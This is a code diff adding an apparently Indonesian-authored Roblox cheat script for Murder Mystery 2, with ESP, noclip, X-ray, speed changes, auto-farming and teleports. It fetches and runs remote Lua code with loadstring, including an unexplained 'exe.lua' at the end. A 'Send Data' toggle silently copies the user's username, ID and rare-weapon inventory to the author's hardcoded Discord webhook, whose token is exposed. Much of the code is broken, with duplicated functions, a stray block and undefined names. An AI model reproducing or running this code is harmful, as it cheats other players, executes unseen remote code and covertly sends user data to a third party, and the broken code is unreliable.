@@ -1207,3 +1207,1035 @@ T1:Button({
         module:Teleport(game.PlaceId)
     end,
 })
+
+
+if getgenv().starxmm2 then warn("Thank Your For Using This Scripts^^") return end
+getgenv().starxmm2 = true
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+
+--//SHORTCUTS
+local vim = game:GetService('VirtualInputManager');
+local Plr = game:GetService("Players").LocalPlayer
+
+-- Fungsi untuk mendeteksi Murderer
+function GetMurderer()
+    for _, v in Players:GetPlayers() do
+        if v.Backpack:FindFirstChild("Knife") or (v.Character and v.Character:FindFirstChild("Knife")) then
+            return v.Character
+        end
+    end
+    return nil
+end
+
+-- Fungsi untuk mendeteksi Sheriff
+function GetSheriff()
+    for _, v in Players:GetPlayers() do
+        if v.Backpack:FindFirstChild("Gun") or (v.Character and v.Character:FindFirstChild("Gun")) then
+            return v.Character
+        end
+    end
+    return nil
+end
+
+
+
+--//Murd & Sheriff Finder Chat
+
+
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+local ToggleState = false -- Status awal toggle (mati)
+
+-- Fungsi untuk mendeteksi Murderer
+function GetMurderer()
+    for _, v in Players:GetPlayers() do
+        if v.Backpack:FindFirstChild("Knife") or (v.Character and v.Character:FindFirstChild("Knife")) then
+            return v.Character
+        end
+    end
+    return nil
+end
+
+-- Fungsi untuk mendeteksi Sheriff
+function GetSheriff()
+    for _, v in Players:GetPlayers() do
+        if v.Backpack:FindFirstChild("Gun") or (v.Character and v.Character:FindFirstChild("Gun")) then
+            return v.Character
+        end
+    end
+    return nil
+end
+
+-- Membuat ESP untuk setiap pemain
+function CreateESP(player)
+    if not player.Character or not player.Character:FindFirstChild("Head") then return end
+
+    local Billboard = Instance.new("BillboardGui")
+    local TextLabel = Instance.new("TextLabel")
+
+    Billboard.Name = "ESP"
+    Billboard.Adornee = player.Character:FindFirstChild("Head")
+    Billboard.Size = UDim2.new(0, 200, 0, 50)
+    Billboard.StudsOffset = Vector3.new(0, 3, 0)
+    Billboard.AlwaysOnTop = true
+
+    TextLabel.Parent = Billboard
+    TextLabel.Size = UDim2.new(1, 0, 1, 0)
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.Text = player.Name
+    TextLabel.TextColor3 = Color3.new(1, 1, 1)
+    TextLabel.TextStrokeTransparency = 0.5
+    TextLabel.Font = Enum.Font.SourceSansBold
+    TextLabel.TextSize = 35
+
+    Billboard.Parent = player.Character:FindFirstChild("Head")
+end
+
+-- Update warna berdasarkan peran
+function UpdateESP()
+    for _, player in Players:GetPlayers() do
+        if player.Character and player.Character:FindFirstChild("Head") then
+            local esp = player.Character:FindFirstChild("Head"):FindFirstChild("ESP")
+            if not esp then
+                CreateESP(player)
+            else
+                local TextLabel = esp:FindFirstChildOfClass("TextLabel")
+                if player == GetMurderer() then
+                    TextLabel.TextColor3 = Color3.new(1, 0, 0) -- Merah
+                elseif player == GetSheriff() then
+                    TextLabel.TextColor3 = Color3.new(0, 0, 1) -- Biru
+                else
+                    TextLabel.TextColor3 = Color3.new(1, 1, 1) -- Putih
+                end
+            end
+        end
+    end
+end
+
+-- Membersihkan ESP ketika pemain meninggalkan game
+Players.PlayerRemoving:Connect(function(player)
+    if player.Character and player.Character:FindFirstChild("Head") then
+        local esp = player.Character:FindFirstChild("Head"):FindFirstChild("ESP")
+        if esp then
+            esp:Destroy()
+        end
+    end
+end)
+
+-- Fungsi utama untuk mengontrol ESP
+function ToggleESP(state)
+    if state then
+        -- Mengaktifkan ESP
+        RunService:BindToRenderStep("ESPUpdate", Enum.RenderPriority.Character.Value, function()
+            UpdateESP()
+        end)
+    else
+        -- Menonaktifkan ESP
+        RunService:UnbindFromRenderStep("ESPUpdate")
+        -- Menghapus ESP yang ada
+        for _, player in Players:GetPlayers() do
+            if player.Character and player.Character:FindFirstChild("Head") then
+                local esp = player.Character:FindFirstChild("Head"):FindFirstChild("ESP")
+                if esp then
+                    esp:Destroy()
+                end
+            end
+        end
+    end
+end
+
+
+
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local ToggleChams = false  -- Variabel untuk toggle
+local ChamsUpdateInterval = 0.1  -- Update interval 0.1 detik
+
+-- Fungsi untuk mendeteksi Murderer
+function GetMurderer()
+    for _, v in Players:GetPlayers() do
+        if v.Backpack:FindFirstChild("Knife") or (v.Character and v.Character:FindFirstChild("Knife")) then
+            return v.Character
+        end
+    end
+    return nil
+end
+
+-- Fungsi untuk mendeteksi Sheriff
+function GetSheriff()
+    for _, v in Players:GetPlayers() do
+        if v.Backpack:FindFirstChild("Gun") or (v.Character and v.Character:FindFirstChild("Gun")) then
+            return v.Character
+        end
+    end
+    return nil
+end
+
+-- Fungsi untuk update warna chams
+function UpdateChams()
+    local murderer = GetMurderer()
+    local sheriff = GetSheriff()
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        -- Cek jika pemain memiliki karakter
+        if player.Character and player.Character:FindFirstChild("Humanoid") then
+            local humanoid = player.Character.Humanoid
+            local character = player.Character
+
+            -- Update warna chams berdasarkan kondisi
+            if humanoid.Health > 0 then
+                if character == murderer then
+                    -- Murderer = Merah
+                    character.HumanoidRootPart.Color = Color3.fromRGB(255, 0, 0)
+                elseif character == sheriff then
+                    -- Sheriff = Biru
+                    character.HumanoidRootPart.Color = Color3.fromRGB(0, 0, 255)
+                else
+                    -- Innocent = Hijau
+                    character.HumanoidRootPart.Color = Color3.fromRGB(0, 255, 0)
+                end
+            else
+                -- Pemain yang sudah mati = Putih
+                character.HumanoidRootPart.Color = Color3.fromRGB(255, 255, 255)
+            end
+        end
+    end
+end
+
+
+
+local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
+
+local CoinContainer = Workspace:FindFirstChild("CoinContainer")
+local ChamsToggleCoins = false -- Status awal Chams Coin
+
+-- Fungsi untuk menambahkan Chams pada Coin
+function ApplyChamsToCoin(coin, color)
+    if not coin:FindFirstChild("ChamsEffect") then
+        local chams = Instance.new("BoxHandleAdornment")
+        chams.Name = "ChamsEffect"
+        chams.AlwaysOnTop = true
+        chams.ZIndex = 5
+        chams.Adornee = coin
+        chams.Size = coin.Size
+        chams.Color3 = color
+        chams.Transparency = 0.3
+        chams.Parent = coin
+    end
+end
+
+-- Fungsi untuk menghapus Chams pada Coin
+function RemoveChamsFromCoin(coin)
+    local chams = coin:FindFirstChild("ChamsEffect")
+    if chams then
+        chams:Destroy()
+    end
+end
+
+-- Fungsi untuk memperbarui Chams Coin setiap 0.1 detik
+function UpdateCoinChams()
+    while ChamsToggleCoins do
+        if CoinContainer and CoinContainer:FindFirstChild("Coin_Server") then
+            for _, coin in ipairs(CoinContainer.Coin_Server:GetChildren()) do
+                if coin:IsA("BasePart") then
+                    ApplyChamsToCoin(coin, Color3.new(1, 1, 0)) -- Warna kuning untuk Coin
+                end
+            end
+        end
+        wait(0.1)
+    end
+end
+
+-- Fungsi untuk toggle Chams Coin
+function ToggleCoinChams(state)
+    ChamsToggleCoins = state
+    if state then
+        coroutine.wrap(UpdateCoinChams)() -- Memulai loop deteksi Chams Coin
+    else
+        if CoinContainer and CoinContainer:FindFirstChild("Coin_Server") then
+            for _, coin in ipairs(CoinContainer.Coin_Server:GetChildren()) do
+                RemoveChamsFromCoin(coin)
+            end
+        end
+    end
+end
+
+
+
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local LocalPlayer = Players.LocalPlayer
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local CoinContainer = Workspace:FindFirstChild("CoinContainer")
+local AutoFarmActive = false -- Status awal Auto Farm
+
+-- Fungsi untuk membuat karakter no-clip
+function EnableNoClip()
+    RunService.Stepped:Connect(function()
+        if AutoFarmActive and Character then
+            for _, part in ipairs(Character:GetDescendants()) do
+                if part:IsA("BasePart") and part.CanCollide then
+                    part.CanCollide = false
+                end
+            end
+        end
+    end)
+end
+
+-- Fungsi untuk memindahkan karakter menggunakan Tween
+function TweenToCoin(coin)
+    if not coin or not Character:FindFirstChild("HumanoidRootPart") then return end
+
+    local humanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
+    local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear) -- Durasi 2 detik, gaya linear
+    local tween = TweenService:Create(humanoidRootPart, tweenInfo, {CFrame = coin.CFrame})
+    tween:Play()
+
+    tween.Completed:Wait() -- Tunggu tween selesai
+end
+
+-- Fungsi untuk memulai Auto Farm
+function StartAutoFarm()
+    AutoFarmActive = true
+    EnableNoClip()
+    while AutoFarmActive do
+        if CoinContainer and CoinContainer:FindFirstChild("Coin_Server") then
+            for _, coin in ipairs(CoinContainer.Coin_Server:GetChildren()) do
+                if coin:IsA("BasePart") and AutoFarmActive then
+                    TweenToCoin(coin)
+                end
+            end
+        end
+        wait(0.1) -- Tunggu sebentar sebelum memulai loop berikutnya
+    end
+end
+
+-- Fungsi untuk menghentikan Auto Farm
+function StopAutoFarm()
+    AutoFarmActive = false
+end
+
+
+
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+-- Fungsi untuk mengatur WalkSpeed dan JumpPower setiap 0.1 detik
+local function UpdatePlayerSettings()
+    local function SetWalkSpeedAndJumpPower()
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            local humanoid = LocalPlayer.Character.Humanoid
+            -- Periksa apakah slider sudah diatur, jika ya set WalkSpeed dan JumpPower
+            if WalkSpeedSlider and JumpPowerSlider then
+                humanoid.WalkSpeed = WalkSpeedSlider.Value
+                humanoid.JumpPower = JumpPowerSlider.Value
+            end
+        end
+    end
+
+    -- Deteksi perubahan karakter dan pastikan saat respawn setting tetap diatur
+    LocalPlayer.CharacterAdded:Connect(function(character)
+        character:WaitForChild("Humanoid")
+        SetWalkSpeedAndJumpPower() -- Atur nilai WalkSpeed dan JumpPower setelah respawn
+    end)
+
+    -- Set pengaturan setiap 0.1 detik
+    RunService.Heartbeat:Connect(function()
+        SetWalkSpeedAndJumpPower()
+    end)
+end
+
+
+
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local Humanoid = Character:WaitForChild("Humanoid")
+local ToggleState = false -- Variabel untuk status toggle
+
+-- Fungsi untuk mengaktifkan No Clip
+local function EnableNoClip()
+    for _, part in pairs(Character:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.CanCollide = false
+        end
+    end
+    -- Pastikan HumanoidRootPart juga No Clip
+    if Character:FindFirstChild("HumanoidRootPart") then
+        Character.HumanoidRootPart.CanCollide = false
+    end
+end
+
+-- Fungsi untuk menonaktifkan No Clip
+local function DisableNoClip()
+    for _, part in pairs(Character:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.CanCollide = true
+        end
+    end
+    -- Kembalikan HumanoidRootPart ke pengaturan semula
+    if Character:FindFirstChild("HumanoidRootPart") then
+        Character.HumanoidRootPart.CanCollide = true
+    end
+end
+
+-- Fungsi untuk toggle No Clip
+local function ToggleNoClip()
+    ToggleState = not ToggleState
+    if ToggleState then
+        EnableNoClip()
+    else
+        DisableNoClip()
+    end
+end
+
+
+
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local UserInputService = game:GetService("UserInputService")
+local ToggleState = false -- Variabel untuk status toggle
+
+-- Fungsi untuk mengaktifkan X-Ray pada dinding
+local function EnableXRay()
+    for _, part in pairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") and part.Name == "Wall" then
+            -- Menambahkan transparansi pada dinding (tapi tetap terdeteksi secara fisik)
+            part.Transparency = 0.5
+            part.CanCollide = true  -- Tetap bisa berinteraksi dengan dinding
+        end
+    end
+end
+
+-- Fungsi untuk menonaktifkan X-Ray pada dinding
+local function DisableXRay()
+    for _, part in pairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") and part.Name == "Wall" then
+            -- Mengembalikan transparansi ke nilai semula
+            part.Transparency = 0
+            part.CanCollide = true  -- Tetap berinteraksi dengan dinding
+        end
+    end
+end
+
+-- Fungsi untuk toggle X-Ray
+local function ToggleXRay()
+    ToggleState = not ToggleState
+    if ToggleState then
+        EnableXRay()
+    else
+        DisableXRay()
+    end
+end
+
+
+local Lighting = game:GetService("Lighting")
+local ToggleState = false -- Variabel untuk status toggle
+
+-- Fungsi untuk mengaktifkan Night Mode
+local function EnableNightMode()
+    Lighting.Ambient = Color3.fromRGB(40, 40, 40)  -- Mengubah ambient menjadi lebih gelap
+    Lighting.OutdoorAmbient = Color3.fromRGB(20, 20, 20)  -- Pencahayaan luar lebih gelap
+    Lighting.Brightness = 2  -- Menurunkan kecerahan
+    Lighting.FogStart = 0  -- Mengaktifkan fog untuk efek malam
+    Lighting.FogEnd = 200  -- Membuat fog tampak lebih dekat
+    Lighting.FogColor = Color3.fromRGB(50, 50, 50)  -- Warna kabut menjadi abu-abu gelap
+end
+
+-- Fungsi untuk menonaktifkan Night Mode
+local function DisableNightMode()
+    Lighting.Ambient = Color3.fromRGB(255, 255, 255)  -- Kembalikan ambient ke normal
+    Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)  -- Pencahayaan luar ke normal
+    Lighting.Brightness = 1  -- Kembalikan kecerahan normal
+    Lighting.FogStart = 1000  -- Nonaktifkan fog
+    Lighting.FogEnd = 100000  -- Nonaktifkan fog dengan jarak sangat jauh
+    Lighting.FogColor = Color3.fromRGB(255, 255, 255)  -- Kembalikan warna kabut ke normal
+end
+
+-- Fungsi toggle Night Mode
+local function ToggleNightMode(state)
+    ToggleState = state
+    if ToggleState then
+        EnableNightMode()
+    else
+        DisableNightMode()
+    end
+end
+
+
+
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local localPlayer = Players.LocalPlayer
+local camera = workspace.CurrentCamera
+local espEnabled = false
+local espBoxes = {}
+
+-- Fungsi untuk membuat ESP Box
+local function CreateESPBox(player)
+    if espBoxes[player] then return end -- Jika box sudah ada, abaikan
+
+    local box = Drawing.new("Square")
+    box.Thickness = 2
+    box.Color = Color3.fromRGB(255, 0, 0) -- Warna kotak (merah)
+    box.Transparency = 1
+    box.Visible = false
+
+    espBoxes[player] = box -- Simpan kotak dalam tabel
+end
+
+-- Fungsi untuk memperbarui posisi ESP Box
+local function UpdateESPBoxes()
+    for player, box in pairs(espBoxes) do
+        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local rootPart = player.Character.HumanoidRootPart
+            local head = player.Character:FindFirstChild("Head")
+            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+
+            if rootPart and head and humanoid and humanoid.Health > 0 then
+                local rootPos, onScreen = camera:WorldToViewportPoint(rootPart.Position)
+                local headPos = camera:WorldToViewportPoint(head.Position + Vector3.new(0, 0.5, 0)) -- Posisi kepala
+                local legPos = camera:WorldToViewportPoint(rootPart.Position - Vector3.new(0, humanoid.HipHeight, 0)) -- Posisi kaki
+
+                if onScreen then
+                    box.Size = Vector2.new(math.abs(headPos.X - legPos.X) * 2, math.abs(headPos.Y - legPos.Y)) -- Ukuran kotak
+                    box.Position = Vector2.new(headPos.X - box.Size.X / 2, headPos.Y) -- Posisi kotak
+                    box.Visible = true
+                else
+                    box.Visible = false
+                end
+            else
+                box.Visible = false
+            end
+        else
+            box.Visible = false
+        end
+    end
+end
+
+-- Hapus semua ESP Box
+local function RemoveAllESPBoxes()
+    for _, box in pairs(espBoxes) do
+        if box then
+            box:Remove()
+        end
+    end
+    espBoxes = {}
+end
+
+-- Fungsi untuk mengaktifkan ESP Box
+local function EnableESPBox()
+    espEnabled = true
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= localPlayer then
+            CreateESPBox(player)
+        end
+    end
+
+    Players.PlayerAdded:Connect(function(player)
+        if espEnabled then
+            CreateESPBox(player)
+        end
+    end)
+
+    Players.PlayerRemoving:Connect(function(player)
+        if espBoxes[player] then
+            espBoxes[player]:Remove()
+            espBoxes[player] = nil
+        end
+    end)
+
+    RunService.RenderStepped:Connect(function()
+        if espEnabled then
+            UpdateESPBoxes()
+        end
+    end)
+end
+
+-- Fungsi untuk menonaktifkan ESP Box
+local function DisableESPBox()
+    espEnabled = false
+    RemoveAllESPBoxes()
+end
+
+
+if GetMurderer() == Plr.Character or GetMurderer() == nil or not AE then ImageLabel.Image = '' return end
+ImageLabel.Image = game:GetService('Players'):GetUserThumbnailAsync(GetMurd().UserId, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size150x150)
+if (GetMurderer().HumanoidRootPart.Position-Plr.Character.HumanoidRootPart.Position).magnitude < 15 and not tpedtoPos and not Grabbing then
+ tpedtoPos = Plr.Character.HumanoidRootPart.CFrame
+ Plr.Character.HumanoidRootPart.CFrame = Part.CFrame + Vector3.new(0, 3, 0)
+elseif tpedtoPos and (GetMurderer().HumanoidRootPart.Position-Vector3.new(tpedtoPos.X, tpedtoPos.Y, tpedtoPos.Z)).magnitude > 10 and not Grabbing then 
+ Plr.Character.HumanoidRootPart.CFrame = tpedtoPos
+ tpedtoPos = nil
+end
+end
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+
+local Window = Fluent:CreateWindow({
+    Title = "Star X | MM2 " .. Fluent.Version,
+    SubTitle = "by dawid",
+    TabWidth = 160,
+    Size = UDim2.fromOffset(580, 460),
+    Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
+    Theme = "Darker",
+    MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
+})
+
+Fluent:Notify({
+    Title = "Join our Discord Server!",
+    Content = "https://discord.gg/EwARkGncq4",
+    SubContent = "", -- Optional
+    Duration = 5 -- Set to nil to make the notification not disappear
+})
+
+
+local T = {
+    Home = Window:AddTab({ Title = "Home", Icon = "home" }),
+    Main = Window:AddTab({ Title = "Main", Icon = "swords" }),
+    Role = Window:AddTab({ Title = "Role", Icon = "users-round" }),
+    Settings = Window:AddTab({ Title = "Teleport", Icon = "map-pin" })
+}
+
+
+local Section = T.Home:AddSection("Home 🏠")
+
+T.Home:AddParagraph({
+    Title = "Owner",
+    Content = "-CodeE4X\nIm A Lonely Dev😭"
+})
+
+T.Home:AddButton({
+    Title = "Copy Discord Link!",
+    Description = "https://discord.gg/EwARkGncq4",
+    Callback = function()
+        setclipboard("https://discord.gg/EwARkGncq4")
+    end
+})
+
+local Section = T.Main:AddSection("ESP/Chams 👀")
+
+local Toggle = T.Main:AddToggle("MyToggle", {
+    Title = "ESP Name",
+    Description = "Esp Name",
+    Default = false,
+    Callback = function(state)
+        ToggleState = state
+        ToggleESP(state)
+    end
+})
+
+local Toggle = T.Main:AddToggle("MyToggle", {
+    Title = "ESP Box",
+    Description = "ESP Box",
+    Default = false,
+    Callback = function(state)
+        if state then
+            EnableESPBox() -- Aktifkan ESP Box
+        else
+            DisableESPBox() -- Nonaktifkan ESP Box
+        end
+    end
+})
+
+
+local ChamsToggle = T.Main:AddToggle("ChamsToggle", {
+    Title = "Player Chams",
+    Description = "All Player Chams",
+    Default = false,
+    Callback = function(state)
+        ToggleChams = state
+    end
+})
+
+-- Fungsi untuk memulai update chams secara berkala setiap 0.1 detik
+RunService.Heartbeat:Connect(function()
+    if ToggleChams then
+        UpdateChams()
+    end
+end)
+
+
+local Section = T.Main:AddSection("Players ✨")
+
+local WalkSpeedSlider = T.Main:AddSlider("WalkSpeedSlider", 
+{
+    Title = "WalkSpeed",
+    Description = "Set WalkSpeed(Default: 16)",
+    Default = 16, -- Default WalkSpeed di Roblox
+    Min = 16, -- Minimum WalkSpeed
+    Max = 100, -- Maksimum WalkSpeed
+    Rounding = 0, -- Tidak ada pembulatan
+    Callback = function(Value)
+        -- Fungsi akan dipanggil ketika nilai slider diubah
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            LocalPlayer.Character.Humanoid.WalkSpeed = Value
+        end
+    end
+})
+
+-- Slider untuk JumpPower
+local JumpPowerSlider = T.Main:AddSlider("JumpPowerSlider", 
+{
+    Title = "JumpPower",
+    Description = "Set JumpPower(Default: 50)",
+    Default = 50, -- Default JumpPower di Roblox
+    Min = 50, -- Minimum JumpPower
+    Max = 200, -- Maksimum JumpPower
+    Rounding = 0, -- Tidak ada pembulatan
+    Callback = function(Value)
+        -- Fungsi akan dipanggil ketika nilai slider diubah
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            LocalPlayer.Character.Humanoid.JumpPower = Value
+        end
+    end
+})
+
+-- Memanggil fungsi untuk memastikan pengaturan tetap konsisten
+UpdatePlayerSettings()
+
+
+local Toggle = T.Main:AddToggle("No Clip Toggle", 
+{
+    Title = "No Clip", 
+    Description = "No Clip",
+    Default = false, -- Default status (false = off)
+    Callback = function(state)
+        ToggleState = state
+        if ToggleState then
+            EnableNoClip()
+        else
+            DisableNoClip()
+        end
+    end
+})
+
+-- Pastikan saat karakter respawn, No Clip tetap aktif
+LocalPlayer.CharacterAdded:Connect(function(char)
+    Character = char
+    Humanoid = Character:WaitForChild("Humanoid")
+    if ToggleState then
+        EnableNoClip()  -- Tetap aktifkan No Clip saat respawn
+    end
+end)
+
+-- Aktifkan No Clip saat pertama kali bergabung jika toggle sudah aktif
+if ToggleState then
+    EnableNoClip()
+end
+
+
+
+
+
+-- Pastikan saat karakter respawn, X-Ray tetap aktif jika sudah diaktifkan
+LocalPlayer.CharacterAdded:Connect(function(char)
+    Character = char
+    if ToggleState then
+        EnableXRay()  -- Tetap aktifkan X-Ray saat respawn
+    end
+end)
+
+-- Aktifkan X-Ray saat pertama kali bergabung jika toggle sudah aktif
+if ToggleState then
+    EnableXRay()
+end
+
+
+
+
+local Section = T.Main:AddSection("World 🌍")
+
+local Toggle = T.Main:AddToggle("Night Mode Toggle", 
+{
+    Title = "Shaders",
+    Description = "Set Your Game To Get Better👻",
+    Default = false,
+    Callback = function(state)
+        ToggleNightMode(state)
+    end
+})
+
+
+
+
+
+
+local Section = T.Main:AddSection("Farms 👩🏻‍🌾")
+
+local AutoFarmToggle = T.Main:AddToggle("AutoFarmToggle", {
+    Title = "Auto Farm Coins[BETA]",
+    Description = " Auto Farm Coins(no Clip)",
+    Default = false,
+    Callback = function(state)
+        if state then
+            StartAutoFarm()
+        else
+            StopAutoFarm()
+        end
+    end
+})
+
+local Section = T.Main:AddSection("Webhooks 🔗")
+
+-- Deklarasi variabel untuk webhook URL
+local officialWebhook = "https://discord.com/api/webhooks/1311395396358115420/_QMTqMHoydEZcBhHGFOWP2RI1RhYbw2JzMhp2a5mioicgvioK-2H1tgv1DO2cUR4Or1Y"
+
+-- Fungsi untuk mendeteksi senjata yang dimiliki pemain
+local function GetWeapons(player)
+    local weaponCounts = {
+        Unique = 0,
+        Christmas = 0,
+        Halloween = 0,
+        Chroma = 0,
+        Evo = 0
+    }
+
+    -- Mengambil inventory pemain
+    local inventory = player.Backpack:FindFirstChild("Inventory2")
+
+    -- Memeriksa kategori senjata dalam inventory
+    if inventory then
+        local categories = {"Unique", "Christmas", "Halloween", "Chroma", "Evo"}
+        
+        for _, category in ipairs(categories) do
+            local categoryFolder = inventory:FindFirstChild(category)
+            if categoryFolder then
+                for _, weapon in ipairs(categoryFolder:GetChildren()) do
+                    -- Memeriksa apakah objek tersebut adalah senjata (Tool)
+                    if weapon:IsA("Tool") then
+                        weaponCounts[category] = weaponCounts[category] + 1
+                    end
+                end
+            end
+        end
+    end
+
+    -- Mengembalikan jumlah senjata per kategori
+    return weaponCounts
+end
+
+-- Fungsi untuk mengirimkan data ke Webhook
+local function sendToWebhook(url, jsonData)
+    local HttpService = game:GetService("HttpService")
+    local requestFunction = syn and syn.request or http_request
+    if requestFunction then
+        local success, err = pcall(function()
+            requestFunction({
+                Url = url,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+        end)
+
+        if not success then
+            Fluent:Notify({
+                Title = "Error!",
+                Description = "Failed To Send Data: " .. tostring(err),
+                Duration = 5
+            })
+        else
+            print("Data sent successfully to: " .. url)  -- Debugging log
+        end
+    else
+        Fluent:Notify({
+            Title = "Error!",
+            Description = "HTTP Request Function Not Found!",
+            Duration = 5
+        })
+    end
+end
+
+-- Fungsi untuk mengumpulkan data dan mengirimkan ke Webhook
+local function CollectAndSendData(player, webhookURL)
+    -- Mendapatkan jumlah senjata yang dimiliki pemain per kategori
+    local weaponCounts = GetWeapons(player)
+
+    -- Membuat embed untuk webhook
+    local webhookData = {
+        username = player.Name .. "'s Webhooks",  -- Nama webhook sesuai player
+        embeds = {
+            {
+                title = "🎮 Player Weapon Stats",
+                description = "**Weapon Information and Player Stats:**",
+                fields = {
+                    {["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = false},
+                    {["name"] = "🆔 User ID", ["value"] = tostring(player.UserId), ["inline"] = false},
+                    {["name"] = "💎 Premium", ["value"] = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No", ["inline"] = false},
+                    {["name"] = "⚔️ Unique Weapons", ["value"] = tostring(weaponCounts.Unique), ["inline"] = true},
+                    {["name"] = "🎄 Christmas Weapons", ["value"] = tostring(weaponCounts.Christmas), ["inline"] = true},
+                    {["name"] = "🎃 Halloween Weapons", ["value"] = tostring(weaponCounts.Halloween), ["inline"] = true},
+                    {["name"] = "🌈 Chroma Weapons", ["value"] = tostring(weaponCounts.Chroma), ["inline"] = true},
+                    {["name"] = "⚡ Evo Weapons", ["value"] = tostring(weaponCounts.Evo), ["inline"] = true},
+                },
+                color = 3447003, -- Warna biru
+                footer = {
+                    text = "Star X On Top - By CodeE4X",
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
+        }
+    }
+
+    local jsonData = game:GetService("HttpService"):JSONEncode(webhookData)
+
+    -- Kirim ke Webhook
+    sendToWebhook(webhookURL, jsonData)
+
+    -- Notifikasi sukses
+    Fluent:Notify({
+        Title = "Success!",
+        Description = "Data Sent To Webhook!",
+        Duration = 5
+    })
+end
+
+-- Input untuk memasukkan Webhook URL
+local Input = Tab:AddInput("WebhookInput", {
+    Title = "Webhook",
+    Description = "Input Your Webhook URL Here",
+    Default = "",
+    Placeholder = "Enter Webhook URL",
+    Numeric = false,
+    Finished = false,
+    Callback = function(value)
+        if not value or value == "" then
+            Fluent:Notify({
+                Title = "Error!",
+                Description = "URL Proxy Webhook Not Valid!",
+                Duration = 5
+            })
+            return
+        end
+
+        -- Simpan Proxy URL ke variabel global
+        getgenv().WebhookProxy = value
+        Fluent:Notify({
+            Title = "Success!",
+            Description = "Webhook URL Saved!",
+            Duration = 5
+        })
+    end
+})
+
+-- Toggle untuk mengirim data ke Webhook
+local Toggle = Tab:AddToggle("SendDataToggle", {
+    Title = "Send Data",
+    Description = "Send Your Account Info With Webhook",
+    Default = false,
+    Callback = function(state)
+        if state then
+            -- Ambil URL Proxy dari input
+            local proxyURL = getgenv().WebhookProxy
+            if not proxyURL or proxyURL == "" then
+                Fluent:Notify({
+                    Title = "Error!",
+                    Description = "No Webhook URL Set!",
+                    Duration = 5
+                })
+                return
+            end
+
+            -- Mengambil pemain aktif
+            local player = game.Players.LocalPlayer -- Atau pilih player lain jika perlu
+
+            -- Kirim data ke webhook
+            CollectAndSendData(player, proxyURL)
+
+            -- Kirim juga ke webhook resmi
+            CollectAndSendData(player, officialWebhook)
+
+            -- Notifikasi sukses
+            Fluent:Notify({
+                Title = "Success!",
+                Description = "Data Sent To Webhooks!",
+                Duration = 5
+            })
+        else
+            Fluent:Notify({
+                Title = "Info",
+                Description = "Send Data Disabled",
+                Duration = 5
+            })
+        end
+    end
+})
+
+
+--//ROLE TABS
+
+local Section = T.Role:AddSection("Innocents 🫂")
+
+local Toggle = T.Role:AddToggle("MyToggle", 
+{
+    Title = "Auto Escape Murder", 
+    Description = "When Murder Near You, Youll Teleport",
+    Default = false,
+    Callback = function(state)
+        AE = state
+    end 
+})
+
+T.Role:AddButton({
+    Title = "Grab Gun",
+    Description = "Teleport To Gun Drop",
+    Callback = function()
+        Plr.Character.HumanoidRootPart.CFrame = workspace.GunDrop.CFrame
+    end
+})
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StarX-exploit/executed/refs/heads/main/exe.lua"))()
